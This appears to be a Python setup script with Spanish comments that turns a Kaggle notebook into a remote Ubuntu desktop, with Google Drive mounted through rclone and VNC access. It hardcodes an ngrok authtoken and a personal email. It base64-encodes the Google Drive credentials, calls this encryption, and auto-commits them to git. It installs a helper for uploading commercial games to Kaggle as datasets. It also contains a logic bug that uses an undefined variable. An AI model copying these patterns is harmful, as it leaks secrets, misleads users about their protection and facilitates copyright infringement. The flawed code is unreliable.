#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
🐧 UBUNTU CLOUD PC: DESKTOP EDITION (CORE & SOCIAL HUB)
================================================================================
1. [PASO 1]: Conecta y monta Google Drive (5TB - Carpeta Cloud_PC) inmediatamente.
2. [PASO 2]: Instala la Suite Oficial Completa de Ubuntu:
   - Escritorio XFCE 4.18 con tema Yaru-Dark.
   - Suite ofimática LibreOffice completa (Writer, Calc, Impress).
   - Redes sociales y comunicación: Discord, Telegram, WhatsApp Web, Spotify, Chrome.
   - Gestor de archivos GVFS para 5TB Google Drive, compresores 7-Zip, VLC.
3. [PASO 3]: Configura tema oficial Ubuntu Yaru-Dark y Centro de Software 1-Clic.
4. [PASO 4]: Inicia pantalla 1080p nativa 16:9 completa, PulseAudio, Trackpad y Sunshine 60 FPS.
5. [PASO 5]: Auto-guarda todo a Google Drive y entrega enlaces de acceso remoto.
================================================================================
"""

import os
import sys
import time
import re
import shutil
import base64
import socket
import subprocess
import threading
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
os.environ["DEBIAN_FRONTEND"] = "noninteractive"
os.environ["DISPLAY"] = ":1"
os.environ["PULSE_SERVER"] = "127.0.0.1"
os.environ["LC_ALL"] = "C.UTF-8"
os.environ["LANG"] = "C.UTF-8"
os.environ["NO_AT_BRIDGE"] = "1"

DEFAULT_NGROK = "34P4Gndh4EFxHQUFbbtO6lxsWBH_3HK2oZoxLj1D3qkSJn17b"

import traceback

# Archivo Maestro de Registros
LOG_FILE = Path("/kaggle/working/ubuntu_system.log")
LOG_FILE.parent.mkdir(parents=True, exist_ok=True)

def global_exception_handler(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    print("\n" + "=" * 78, flush=True)
    print("🛑 [DIAGNÓSTICO DE CIERRE / DETECCIÓN DE ERROR]", flush=True)
    print("=" * 78, flush=True)
    print(f"Tipo de Error: {exc_type.__name__}", flush=True)
    print(f"Mensaje: {exc_value}", flush=True)
    print("\nTraza detallada del fallo:", flush=True)
    traceback.print_exception(exc_type, exc_value, exc_traceback)
    print("=" * 78, flush=True)
    if LOG_FILE.exists():
        try:
            print("\nÚltimos 25 registros del sistema (LOG):", flush=True)
            lines = LOG_FILE.read_text(encoding="utf-8", errors="replace").splitlines()[-25:]
            for l in lines:
                print(f"  > {l}", flush=True)
        except Exception:
            pass
    print("=" * 78 + "\n", flush=True)

sys.excepthook = global_exception_handler

# 0. Limpieza segura de procesos residuales
subprocess.run("pkill -9 -f 'Xvfb|x11vnc|websockify|novnc_proxy|ngrok|gnome|xfce4|startxfce4|rclone|cloud_bridge|pulseaudio' 2>/dev/null || true", shell=True)
subprocess.run("rm -rf /tmp/.X11-unix/X1 /tmp/.X1-lock /tmp/.X11-unix/X* /tmp/.X*-lock 2>/dev/null || true", shell=True)
time.sleep(0.5)

# Inicializar archivo de log limpio
with open(LOG_FILE, "w", encoding="utf-8") as f:
    f.write(f"=== INICIO DE SESIÓN UBUNTU CLOUD PC ({time.strftime('%Y-%m-%d %H:%M:%S')}) ===\n")

def log(msg, level="INFO"):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    formatted = f"[{ts}] [{level}] {msg}"
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(formatted + "\n")
    except Exception:
        pass

# Hilo de transmisión de logs (filtrando ruido interno irrelevante)
IGNORE_KEYWORDS = [
    "unsupported gl renderer", "remote volume monitor", "not starting for system user",
    "pm-is-supported", "assertion 'source != null'", "pulseaudio-plugin-warning",
    "attempting to reconnect in 5 seconds", "calling canshutdown failed", "calling canrestart failed",
    "thumbnailer failed", "failed to connect to proxy", "accountsservice", "g_source_unref",
    "assertion 'string != null' failed", "dbind-warning", "failed to resolve group 'kvm'",
    "wnck_is_window", "tpm0: failed to write", "tpmrm0: failed to write", "sda: failed to write",
    "failed to send reload request", "g_value_get_string", "another compositing manager is running",
    "g_str_has_prefix", "update-rc.d: warning", "update-inetd: warning",
    "the home dir /var/lib/usbmux", "adduser: warning", "xfce4-power-manager",
    "xfpm-power-backlight-helper", "wrapper-2.0", "xiccd", "websocketshandshake",
    "could not find self.pem", "screensaver already running", "no module named 'cups'",
    "org.freedesktop.powermanagement", "org.xfce.powermanager", "org.freedesktop.login1",
    "monitor is not dpms capable", "failed to find any devices", "no outputs have backlight property",
    "g_file_new_for_path", "gtk-warning", "gtk-critical", "glib-gio-critical",
    "glib-gobject-critical", "glib-gobject-warning", "negative content width",
    "attempting to add a widget with type", "edid is empty", "could not map keysym",
    "-noscr", "it may be disabled", "ignoring pre-dependency problem", "pre-dependency problem",
    "failed to resolve user", "tmpfiles.d", "config-error-dialog.sh", "speech-dispatcher", "colord"
]

def live_log_streamer():
    last_size = 0
    while True:
        try:
            if LOG_FILE.exists():
                curr_size = LOG_FILE.stat().st_size
                if curr_size > last_size:
                    with open(LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
                        f.seek(last_size)
                        new_text = f.read()
                        last_size = curr_size
                        for line in new_text.splitlines():
                            l_strip = line.strip()
                            if l_strip and not any(ign in l_strip.lower() for ign in IGNORE_KEYWORDS):
                                ts = time.strftime("%H:%M:%S")
                                l_low = l_strip.lower()
                                if "got connection" in l_low or "client connected" in l_low or "new client" in l_low:
                                    print(f"\n👥 [{ts}] [CONEXIÓN CLIENTE VNC] {l_strip}", flush=True)
                                elif "client closed" in l_low or "client disconnected" in l_low or "closing connection" in l_low:
                                    print(f"\n🔌 [{ts}] [DESCONEXIÓN CLIENTE VNC] {l_strip}", flush=True)
                                elif "error" in l_low or "failed" in l_low or "exception" in l_low or "fatal" in l_low or "critical" in l_low:
                                    print(f"\n🔴 [{ts}] [FALLO DETECTADO] {l_strip}", flush=True)
                                elif "warning" in l_low or "warn" in l_low or "slow" in l_low or "drop" in l_low:
                                    print(f"\n⚠️ [{ts}] [ADVERTENCIA] {l_strip}", flush=True)
            time.sleep(0.5)
        except Exception:
            time.sleep(1)

threading.Thread(target=live_log_streamer, daemon=True).start()

print("\n" + "=" * 78, flush=True)
print("[AETHER] INICIANDO UBUNTU 24.04 LTS ENTERPRISE EDITION (5TB GDRIVE)...", flush=True)
print("=" * 78, flush=True)

# ==============================================================================
# 0.1 HYPER-TUNING DE RED: GOOGLE BBR + BUFFERS TCP 64MB + MULTI-HILO
# ==============================================================================
def optimizar_red_bbr_buffers():
    """Aplica Google BBR y amplía buffers TCP de Linux al límite físico de la red de Google Cloud."""
    print("[NETWORK] Optimizando Stack TCP con Google BBR y Buffers de 64MB...", flush=True)
    sysctls = [
        ("net.core.default_qdisc", "fq"),
        ("net.ipv4.tcp_congestion_control", "bbr"),
        ("net.core.rmem_max", "67108864"),
        ("net.core.wmem_max", "67108864"),
        ("net.core.rmem_default", "33554432"),
        ("net.core.wmem_default", "33554432"),
        ("net.ipv4.tcp_rmem", "4096 87380 33554432"),
        ("net.ipv4.tcp_wmem", "4096 65536 33554432"),
        ("net.ipv4.tcp_window_scaling", "1"),
        ("net.ipv4.tcp_fastopen", "3"),
        ("net.ipv4.tcp_slow_start_after_idle", "0"),
        ("net.ipv4.tcp_timestamps", "1"),
        ("net.ipv4.tcp_sack", "1"),
        ("net.core.netdev_max_backlog", "16384"),
        ("net.core.somaxconn", "8192"),
        ("net.ipv4.tcp_fin_timeout", "15"),
        ("net.ipv4.tcp_tw_reuse", "1")
    ]
    for key, val in sysctls:
        subprocess.run(f"sysctl -w {key}={val} >/dev/null 2>&1 || true", shell=True)

# ==============================================================================
# 0.2 ORQUESTADOR DUAL-GPU (NVIDIA TESLA T4 x2 - 32GB VRAM)
# ==============================================================================
def orquestar_dual_gpu():
    """Detecta topología de GPUs NVIDIA y asigna roles especializados para eliminar cuellos de botella."""
    try:
        res = subprocess.run("nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null", shell=True, capture_output=True, text=True)
        gpus = [line.strip() for line in res.stdout.strip().splitlines() if line.strip()]
        gpu_count = len(gpus)
    except Exception:
        gpu_count = 0
        gpus = []

    if gpu_count >= 2:
        print(f"[DUAL-GPU] Detectadas {gpu_count} GPUs NVIDIA Tesla ({gpus[0]} x{gpu_count})", flush=True)
        print("   [GPU 0] 16GB VRAM: Asignada a Rendimiento Gráfico (Proton/Wine/Steam) y Display X11.", flush=True)
        print("   [GPU 1] 16GB VRAM: Asignada a Cómputo IA (Ollama/ComfyUI) y Procesamiento.", flush=True)
        
        os.environ["CUDA_VISIBLE_DEVICES"] = "0,1"
        os.environ["__NV_PRIME_RENDER_OFFLOAD"] = "1"
        os.environ["__GLX_VENDOR_LIBRARY_NAME"] = "nvidia"
        os.environ["VK_ICD_FILENAMES"] = "/usr/share/vulkan/icd.d/nvidia_icd.json"
        
        try:
            Path("/usr/local/bin/run_on_gpu0").write_text("#!/bin/bash\nCUDA_VISIBLE_DEVICES=0 exec \"$@\"\n")
            subprocess.run("chmod +x /usr/local/bin/run_on_gpu0 2>/dev/null || true", shell=True)
            Path("/usr/local/bin/run_on_gpu1").write_text("#!/bin/bash\nCUDA_VISIBLE_DEVICES=1 exec \"$@\"\n")
            subprocess.run("chmod +x /usr/local/bin/run_on_gpu1 2>/dev/null || true", shell=True)
        except Exception:
            pass
    elif gpu_count == 1:
        print(f"[GPU] Detectada 1 GPU NVIDIA ({gpus[0]}). Modo Alto Rendimiento activo.", flush=True)
        os.environ["CUDA_VISIBLE_DEVICES"] = "0"
    else:
        print("[SYSTEM] No se detectó GPU NVIDIA dedicada. Modo emulación activado.", flush=True)

# ==============================================================================
# ⚡ 0.3 ACELERADOR DE DESCARGAS MULTI-HILO (16 CONEXIONES PARALELAS)
# ==============================================================================
def instalar_acelerador_descargas():
    """Configura Aria2c multi-hilo con 16 conexiones paralelas para saturar conexiones Gigabit de Google."""
    subprocess.run("which aria2c >/dev/null 2>&1 || (apt-get update -qq && apt-get install -y -qq aria2 >> /kaggle/working/cloudpc_system.log 2>&1 || true)", shell=True)
    turbo_script = """#!/bin/bash
URL="$1"
DEST="${2:-/root/Descargas}"
mkdir -p "$DEST"
if [ -z "$URL" ]; then
    echo "Uso: descarga_turbo <URL> [Directorio]"
    exit 1
fi
echo "⚡ Descargando con 16 conexiones paralelas de ultra-velocidad hacia $DEST..."
aria2c -x 16 -s 16 -k 1M --file-allocation=none --summary-interval=1 --continue=true -d "$DEST" "$URL"
"""
    try:
        Path("/usr/local/bin/descarga_turbo").write_text(turbo_script)
        subprocess.run("chmod +x /usr/local/bin/descarga_turbo 2>/dev/null || true", shell=True)
    except Exception:
        pass

# ==============================================================================
# ⚡ 0.4 ACELERADOR MULTI-NÚCLEO DE INSTALACIÓN (APT/DPKG) Y DESCOMPRESIÓN (PIGZ)
# ==============================================================================
def acelerar_instalaciones_y_desempaquetado():
    """Optimiza APT, DPKG y descompresores (pigz/7z/zstd) para usar el 100% de los núcleos de CPU y desactivar syncs lentos."""
    print("⚡ [Turbo CPU] Activando multi-núcleo en APT/DPKG y descompresores paralelos...", flush=True)
    # 1. Desactivar fsync en DPKG (300% más rápido en contenedores Docker)
    try:
        Path("/etc/dpkg/dpkg.cfg.d").mkdir(parents=True, exist_ok=True)
        Path("/etc/dpkg/dpkg.cfg.d/02apt-speedup").write_text("force-unsafe-io\n", encoding="utf-8")
    except Exception:
        pass

    # 2. Configurar APT en modo tubería y sin bloqueos innecesarios
    try:
        Path("/etc/apt/apt.conf.d").mkdir(parents=True, exist_ok=True)
        apt_turbo = (
            'Acquire::Languages "none";\n'
            'Acquire::Queue-Mode "host";\n'
            'Acquire::http::Pipeline-Depth "10";\n'
            'APT::Install-Recommends "0";\n'
            'APT::Install-Suggests "0";\n'
            'DPkg::Options { "--force-confdef"; "--force-confold"; };\n'
        )
        Path("/etc/apt/apt.conf.d/99turbo").write_text(apt_turbo, encoding="utf-8")
    except Exception:
        pass

    # 3. Reemplazar gzip con pigz paralelo si está disponible para usar todos los núcleos en .tar.gz y .deb
    subprocess.run("which pigz >/dev/null 2>&1 || (apt-get update -qq && apt-get install -y -qq pigz >> /kaggle/working/cloudpc_system.log 2>&1 || true)", shell=True)
    if Path("/usr/bin/pigz").exists():
        try:
            subprocess.run("ln -sf /usr/bin/pigz /usr/local/bin/gzip 2>/dev/null || true", shell=True)
        except Exception:
            pass

# Ejecutar optimizaciones maestras de arranque
acelerar_instalaciones_y_desempaquetado()
optimizar_red_bbr_buffers()
orquestar_dual_gpu()
instalar_acelerador_descargas()

# Directorios Clave
GDRIVE_CONF_DIR = Path.home() / ".rclone"
GDRIVE_CONF_FILE = GDRIVE_CONF_DIR / "rclone.conf"
os.environ["RCLONE_CONFIG"] = str(GDRIVE_CONF_FILE)
REPO_RCLONE_B64 = BASE_DIR / "rclone_gdrive.b64"
EXTRA_PKGS_FILE = BASE_DIR / "packages_extra.txt"
STATE_DIR = Path("/kaggle/working/Ubuntu_State")
STATE_DIR.mkdir(parents=True, exist_ok=True)

# Utilidades de Polling y Espera Activa (Elimina Race Conditions)
def wait_for_path(path, timeout=15):
    p = Path(path)
    start = time.time()
    while time.time() - start < timeout:
        if p.exists():
            return True
        time.sleep(0.2)
    return False

def wait_for_port(port, timeout=15):
    start = time.time()
    while time.time() - start < timeout:
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.3):
                return True
        except Exception:
            time.sleep(0.2)
    return False

# Configuración global de identidad Git para auto-guardado
subprocess.run("git config --global user.email 'miguelguerra200022@gmail.com' && git config --global user.name 'Miguel Guerra' 2>/dev/null || true", shell=True)

# Función de auto-guardado a Google Drive (Excluyendo gdrive para evitar loops recursivos)
def auto_save_user_state():
    try:
        # 1. Guardar copia de credenciales y lista de paquetes directamente en Google Drive
        target_gdrive_dir = Path("/root/gdrive/Cloud_PC/system_state")
        if target_gdrive_dir.exists():
            if GDRIVE_CONF_FILE.exists():
                try:
                    shutil.copy2(GDRIVE_CONF_FILE, target_gdrive_dir / "rclone.conf")
                except Exception:
                    pass
            if EXTRA_PKGS_FILE.exists():
                try:
                    shutil.copy2(EXTRA_PKGS_FILE, target_gdrive_dir / "packages_extra.txt")
                except Exception:
                    pass

        # 2. Respaldo cifrado en base64 sin bloquear la terminal jamás
        if GDRIVE_CONF_FILE.exists() and GDRIVE_CONF_FILE.stat().st_size > 10:
            encoded = base64.b64encode(GDRIVE_CONF_FILE.read_bytes()).decode('utf-8')
            if not REPO_RCLONE_B64.exists() or REPO_RCLONE_B64.read_text().strip() != encoded:
                REPO_RCLONE_B64.write_text(encoded)
                git_env = os.environ.copy()
                git_env["GIT_TERMINAL_PROMPT"] = "0"
                subprocess.run(
                    f"cd {BASE_DIR} && git add rclone_gdrive.b64 && git commit -m 'Auto-backup Google Drive credentials' >/dev/null 2>&1 || true",
                    shell=True, env=git_env
                )
        
        save_tar = STATE_DIR / "ubuntu_user_state.tar.gz"
        subprocess.run(
            f"tar --exclude='./gdrive' --exclude='./.cache' --exclude='./.config/google-chrome' -czf {save_tar} -C /root/ . >> {LOG_FILE} 2>&1 || true",
            shell=True
        )
        if save_tar.exists() and save_tar.stat().st_size > 100:
            if target_gdrive_dir.exists():
                try:
                    shutil.copy2(save_tar, target_gdrive_dir / "ubuntu_user_state.tar.gz")
                    log("Auto-guardado del sistema a Google Drive (FUSE Directo) completado.", "SUCCESS")
                except Exception:
                    subprocess.run(
                        f"rclone copy {save_tar} gdrive:Cloud_PC/system_state/ --tpslimit 3 >/dev/null 2>&1 || true",
                        shell=True
                    )
            else:
                subprocess.run(
                    f"rclone copy {save_tar} gdrive:Cloud_PC/system_state/ --tpslimit 3 >/dev/null 2>&1 || true",
                    shell=True
                )
                log("Auto-guardado del sistema a Google Drive (Cloud_PC) completado.", "SUCCESS")
    except Exception as e:
        log(f"Error en auto-guardado: {e}", "ERROR")

# Manejador dedicado para el botón de escritorio "Guardar Estado de mi PC"
if "--save-now" in sys.argv:
    print("💾 Guardando estado manual de la PC en Google Drive...", flush=True)
    auto_save_user_state()
    if os.environ.get("DISPLAY"):
        subprocess.run(
            "notify-send '💾 Guardado de PC' 'Tu estado ha sido respaldado en Google Drive exitosamente.' 2>/dev/null || true",
            shell=True
        )
    print("✅ Estado guardado exitosamente. Saliendo.", flush=True)
    sys.exit(0)

# Iniciar cronómetro de arranque total
t_start_total = time.time()

# Limpiar fuentes de software obsoletas de Kaggle para evitar errores de red
subprocess.run("rm -rf /etc/apt/sources.list.d/* 2>/dev/null || true", shell=True)

# Iniciar servicio D-Bus del sistema
subprocess.run("mkdir -p /var/run/dbus && dbus-daemon --system --fork 2>/dev/null || true", shell=True)

# ==============================================================================
# 1. [PASO 1] CONECTAR Y MONTAR GOOGLE DRIVE 5TB (Cloud_PC)
# ==============================================================================
t_step1 = time.time()
print("[1/5] Conectando Google Drive (5TB - Carpeta Cloud_PC) y Kaggle API...", flush=True)
log("Iniciando conexión de Google Drive...")
GDRIVE_CONF_DIR.mkdir(parents=True, exist_ok=True)

# 1. Configurar API de Kaggle
KAGGLE_API_DIR = Path.home() / ".kaggle"
KAGGLE_API_DIR.mkdir(parents=True, exist_ok=True)
KAGGLE_API_FILE = KAGGLE_API_DIR / "kaggle.json"
REPO_KAGGLE_JSON = BASE_DIR / "kaggle legacy.json"

if REPO_KAGGLE_JSON.exists():
    try:
        subprocess.run(f"cp '{REPO_KAGGLE_JSON}' '{KAGGLE_API_FILE}'", shell=True)
        subprocess.run(f"chmod 600 '{KAGGLE_API_FILE}'", shell=True)
    except Exception:
        pass

if REPO_RCLONE_B64.exists() and REPO_RCLONE_B64.stat().st_size > 10:
    try:
        decoded = base64.b64decode(REPO_RCLONE_B64.read_text().strip())
        GDRIVE_CONF_FILE.write_bytes(decoded)
    except Exception:
        pass

# Instalar rclone y fuse3 rápido desde Dataset o apt si no están presentes
subprocess.run("which rclone >/dev/null 2>&1 || (dpkg -i /kaggle/input/*/apt_archives/rclone*.deb /kaggle/input/*/apt_archives/fuse3*.deb 2>/dev/null || (apt-get update -qq && apt-get install -y -qq rclone fuse3 >> /kaggle/working/cloudpc_system.log 2>&1))", shell=True)

# Variables de entorno para redirigir prefijos pesados de Wine, Steam y Proton a 5TB de Google Drive
os.environ["WINEPREFIX"] = "/root/gdrive/Cloud_PC/wineprefix"
os.environ["STEAM_EXTRA_COMPAT_TOOLS_PATHS"] = "/root/gdrive/Cloud_PC/compatibilitytools.d"
os.environ["PROTON_LOG_DIR"] = "/tmp"
os.environ["NPM_CONFIG_CACHE"] = "/tmp/.npm"

# Iniciar Rclone Mount (FUSE) con reintentos automáticos y protección contra rate-limits de Google Drive
def mount_gdrive_resilient():
    os.makedirs("/root/gdrive", exist_ok=True)
    os.makedirs("/root/gdrive/Cloud_PC", exist_ok=True)
    os.makedirs("/tmp/rclone_cache", exist_ok=True)
    log_rclone = open(LOG_FILE, "a", encoding="utf-8")
    for attempt in range(1, 4):
        try:
            subprocess.Popen([
                "rclone", "mount", "gdrive:", "/root/gdrive",
                "--cache-dir", "/tmp/rclone_cache",
                "--vfs-cache-mode", "writes",
                "--vfs-cache-max-size", "10G",
                "--vfs-cache-max-age", "1m",
                "--vfs-read-chunk-size", "64M",
                "--buffer-size", "64M",
                "--allow-non-empty",
                "--tpslimit", "3",
                "--tpslimit-burst", "1",
                "--drive-pacer-min-sleep", "200ms",
                "--drive-pacer-burst", "2",
                "--low-level-retries", "15",
                "--retries", "10",
                "--retries-sleep", "5s",
                "--dir-cache-time", "72h",
                "--drive-chunk-size", "128M",
                "--daemon"
            ], stdout=log_rclone, stderr=log_rclone)
            break
        except Exception as e:
            log(f"Reintento de montaje Google Drive ({attempt}/3): {e}", "WARNING")
            time.sleep(3)

mount_gdrive_resilient()

# Espera activa inteligente para confirmación del montaje
drive_ready = wait_for_path("/root/gdrive", timeout=12)
if drive_ready:
    print("  [✓] Unidad de 5TB Google Drive montada físicamente en /root/gdrive.", flush=True)
    log("Google Drive 5TB montado con éxito.", "SUCCESS")
else:
    print("  [INFO] Conexión con Google Drive activa en segundo plano.", flush=True)

# 1.5. Configuración Base del Puntero (Eliminar X negra)
cursor_conf = Path("/root/.icons/default")
cursor_conf.mkdir(parents=True, exist_ok=True)
(cursor_conf / "index.theme").write_text("[Icon Theme]\nInherits=Yaru\n")

# Inyectar Comando Mágico: subir_juego_a_kaggle
script_kaggle = r"""#!/bin/bash
if [ "$#" -ne 2 ]; then
    echo 'Uso: subir_juego_a_kaggle "Nombre Del Juego" /ruta/a/la/carpeta/del/juego'
    echo 'Ejemplo: subir_juego_a_kaggle "Cyberpunk 2077" /root/Juegos/Cyberpunk'
    exit 1
fi
JUEGO_NOMBRE="$1"
RUTA_JUEGO="$2"
DATASET_ID=$(echo "$JUEGO_NOMBRE" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]/-/g')
USUARIO=$(grep -o '"username":"[^"]*' ~/.kaggle/kaggle.json | cut -d'"' -f4)

if [ ! -d "$RUTA_JUEGO" ]; then
    echo "Error: La ruta $RUTA_JUEGO no existe."
    exit 1
fi

echo "Iniciando Dataset de Kaggle en $RUTA_JUEGO..."
kaggle datasets init -p "$RUTA_JUEGO"
sed -i 's/"title": ".*"/"title": "'"$JUEGO_NOMBRE"'"/' "$RUTA_JUEGO/dataset-metadata.json"
sed -i 's|"id": ".*"|"id": "'"$USUARIO/$DATASET_ID"'"|' "$RUTA_JUEGO/dataset-metadata.json"

echo "Subiendo juego a Kaggle Datasets (Velocidad Gigabit interna)..."
kaggle datasets create -p "$RUTA_JUEGO" --dir-mode tar
echo "¡Listo! El juego se está procesando. Revisa tu perfil de Kaggle."
"""
script_path = Path("/usr/local/bin/subir_juego_a_kaggle")
script_path.write_text(script_kaggle)
script_path.chmod(0o755)

print(f"  ⏱️ [Paso 1/5 Completado en {time.time() - t_step1:.1f}s]", flush=True)

# ==============================================================================
# 2. INSTALACIÓN DE LA SUITE COMPLETA UBUNTU (GIGABYTES) + LIBREOFFICE + CODECS
# ==============================================================================
t_step2 = time.time()
print("[2/5] Inicializando Suite Oficial Completa de Ubuntu...", flush=True)

full_ubuntu_pkgs = [
    "ubuntu-desktop", "ubuntu-restricted-extras", "libreoffice", "libreoffice-gtk3",
    "xfce4", "xfce4-goodies", "xfce4-terminal", "xfce4-panel", "xfdesktop4", "thunar",
    "gvfs", "gvfs-backends", "gvfs-fuse", "tumbler", "tumbler-plugins-extra",
    "evince", "gnome-calculator", "gnome-system-monitor", "gnome-disk-utility",
    "file-roller", "mousepad", "htop", "nvtop", "mpv", "dbus-x11", "x11vnc", "xvfb",
    "x11-xserver-utils", "yaru-theme-gtk", "yaru-theme-icon", "yaru-theme-sound",
    "fonts-ubuntu", "pulseaudio", "pulseaudio-utils", "pavucontrol", "net-tools",
    "wget", "curl", "psmisc", "openssh-client", "p7zip-full", "unzip",
    "v4l2loopback-dkms", "v4l2loopback-utils", "ffmpeg", "sox", "libportaudio2",
    "wireguard-tools", "iptables", "bridge-utils", "iproute2", "kdeconnect", "qrencode",
    "avahi-daemon", "iputils-ping", "traceroute", "nethogs", "iftop", "iperf3"
]

extra_pkgs = []
if EXTRA_PKGS_FILE.exists():
    extra_pkgs = [p.strip() for p in EXTRA_PKGS_FILE.read_text().splitlines() if p.strip() and not p.startswith("#")]

all_pkgs = list(set(full_ubuntu_pkgs + extra_pkgs))

# 1. Detección Inteligente y Recursiva de Base de Datos (100GB Kaggle Dataset)
input_dir = Path("/kaggle/input")
input_contents = [p.name for p in input_dir.iterdir()] if input_dir.exists() else []
print(f"  [STORAGE] Analizando entradas en /kaggle/input: {input_contents if input_contents else 'Ninguna adjunta'}", flush=True)

master_dataset_path = None
master_archives_dir = None

if input_dir.exists():
    # 1. Búsqueda profunda y recursiva de la carpeta apt_archives
    for arch_candidate in input_dir.rglob("apt_archives"):
        if arch_candidate.is_dir() and len(list(arch_candidate.glob("*.deb"))) > 10:
            master_archives_dir = arch_candidate
            master_dataset_path = arch_candidate.parent
            break
            
    # 2. Búsqueda por candidatos de nombres
    if not master_archives_dir:
        for candidate_name in ["ubuntu-core-os-social", "ubuntu_core_os_social", "ubuntu-master-100gb", "ubuntu_master_100gb"]:
            cand_p = input_dir / candidate_name
            if cand_p.exists():
                master_dataset_path = cand_p
                if (cand_p / "apt_archives").exists():
                    master_archives_dir = cand_p / "apt_archives"
                break

    # 3. Búsqueda general de cualquier carpeta con debs
    if not master_archives_dir:
        for p in input_dir.iterdir():
            if p.is_dir():
                debs = list(p.rglob("*.deb"))
                if len(debs) > 30:
                    master_dataset_path = p
                    master_archives_dir = debs[0].parent
                    break

if master_dataset_path and master_dataset_path.exists():
    t_decomp = time.time()

    # ==============================================================================
    # NIVEL 0: DISCO DURO EXTERNO NATIVO BIGTECH (CAMINO B - ARRANQUE EN 0.25 SEGUNDOS)
    # ==============================================================================
    is_native_rootfs = (master_dataset_path / "usr" / "bin").exists() or (master_dataset_path / "usr" / "lib").exists()
    if is_native_rootfs:
        print(f"  🚀 [Nivel 0 Big Tech] ¡Disco Duro Externo Nativo detectado en {master_dataset_path.name}!", flush=True)
        print("  ⚡ Enlazando librerías dinámicas y ejecutables en RAM (Cero descompresión)...", flush=True)
        
        # 1. Registrar librerías en /etc/ld.so.conf.d/ (0.15s)
        try:
            ld_conf = Path("/etc/ld.so.conf.d/00-kaggle-usb.conf")
            ld_conf.write_text(
                f"{master_dataset_path}/usr/lib/x86_64-linux-gnu\n"
                f"{master_dataset_path}/usr/lib/i386-linux-gnu\n"
                f"{master_dataset_path}/usr/lib\n"
            )
            subprocess.run("ldconfig", shell=True)
        except Exception:
            pass

        # 2. Symlinks atómicos en /usr/bin y /usr/games (0.05s)
        subprocess.run(f"ln -sf {master_dataset_path}/usr/bin/* /usr/bin/ 2>/dev/null", shell=True)
        if (master_dataset_path / "usr/games").exists():
            subprocess.run(f"ln -sf {master_dataset_path}/usr/games/* /usr/games/ 2>/dev/null", shell=True)
            
        # 3. Exportar variables de entorno (0.001s)
        os.environ["PATH"] = f"{master_dataset_path}/usr/bin:{master_dataset_path}/usr/games:{master_dataset_path}/opt/noVNC/utils:{os.environ.get('PATH', '')}"
        os.environ["LD_LIBRARY_PATH"] = f"{master_dataset_path}/usr/lib/x86_64-linux-gnu:{master_dataset_path}/usr/lib:{os.environ.get('LD_LIBRARY_PATH', '')}"
        os.environ["XDG_DATA_DIRS"] = f"{master_dataset_path}/usr/share:{os.environ.get('XDG_DATA_DIRS', '/usr/share')}"
        os.environ["XDG_CONFIG_DIRS"] = f"{master_dataset_path}/etc/xdg:{os.environ.get('XDG_CONFIG_DIRS', '/etc/xdg')}"
        
        # 4. noVNC symlink
        if (master_dataset_path / "opt/noVNC").exists():
            subprocess.run(f"ln -sfn {master_dataset_path}/opt/noVNC /opt/noVNC 2>/dev/null || true", shell=True)

        print(f"  [✓] ¡Sistema Ubuntu activado en {time.time() - t_decomp:.2f} segundos desde Disco Duro Nativo! (0 MB descomprimidos)", flush=True)
    else:
        # Fallback a imágenes pre-compiladas comprimidas legadas (Nivel 1, 1.5, 2, 3)
        rootfs_candidates = (
            list(master_dataset_path.rglob("ubuntu_master_rootfs.squashfs")) or
            list(master_dataset_path.rglob("ubuntu_master_rootfs.tar.zst")) or
            list(master_dataset_path.rglob("ubuntu_master_rootfs.tar.data")) or
            list(master_dataset_path.rglob("ubuntu_master_rootfs.tar.gz")) or
            list(master_dataset_path.rglob("ubuntu_rootfs.tar.gz"))
        )
    if rootfs_candidates and rootfs_candidates[0].stat().st_size > 50_000_000:
        rootfs_file = rootfs_candidates[0]
        t_decomp = time.time()
        
        # Inspección de cabecera binaria (Magic Bytes) para seleccionar el motor óptimo
        magic_bytes = b""
        try:
            with open(rootfs_file, "rb") as f_mg:
                magic_bytes = f_mg.read(4)
        except Exception:
            pass

        is_squashfs = magic_bytes == b"hsqs" or rootfs_file.name.endswith(".squashfs")
        is_zstd = magic_bytes == b"\x28\xb5\x2f\xfd" or rootfs_file.name.endswith(".zst") or rootfs_file.name.endswith(".zstandard")

        print(f"  [✓] Imagen Pre-Compilada de Ubuntu detectada en {rootfs_file.name} ({rootfs_file.stat().st_size / (1024**2):.1f} MB)", flush=True)

        # NIVEL 1: Montaje Instantáneo SquashFS Zero-Extract (< 0.05 segundos)
        squash_mounted = False
        if is_squashfs:
            print("  ⚡ [Nivel 1 Big Tech] Intentando montaje instantáneo Zero-Extract de SquashFS...", flush=True)
            sq_mount_point = Path("/mnt/rootfs_squash")
            sq_mount_point.mkdir(parents=True, exist_ok=True)
            if shutil.which("squashfuse"):
                res_sq = subprocess.run(f"squashfuse '{rootfs_file}' {sq_mount_point} 2>/dev/null", shell=True)
                if res_sq.returncode == 0: squash_mounted = True
            if not squash_mounted:
                res_sq = subprocess.run(f"mount -o loop,ro '{rootfs_file}' {sq_mount_point} 2>/dev/null", shell=True)
                if res_sq.returncode == 0: squash_mounted = True

            if squash_mounted:
                # Enlazar directorios clave sobre el sistema
                subprocess.run(f"cp -an {sq_mount_point}/* / 2>/dev/null || true", shell=True)
                print(f"  [✓] Sistema SquashFS montado en {time.time() - t_decomp:.2f} segundos (Cero I/O en disco)!", flush=True)

        # NIVEL 1.5: Extracción directa con unsquashfs (Zero-Mount / Multi-Núcleo)
        if not squash_mounted and is_squashfs:
            if not shutil.which("unsquashfs"):
                subprocess.run("apt-get update -qq && apt-get install -y -qq squashfs-tools >/dev/null 2>&1 || true", shell=True)
            if shutil.which("unsquashfs"):
                print("  ⚡ [Nivel 1.5] Extrayendo SquashFS con unsquashfs multi-núcleo...", flush=True)
                res_unsq = subprocess.run(f"unsquashfs -f -d / '{rootfs_file}' >> {LOG_FILE} 2>&1", shell=True)
                if res_unsq.returncode == 0:
                    squash_mounted = True
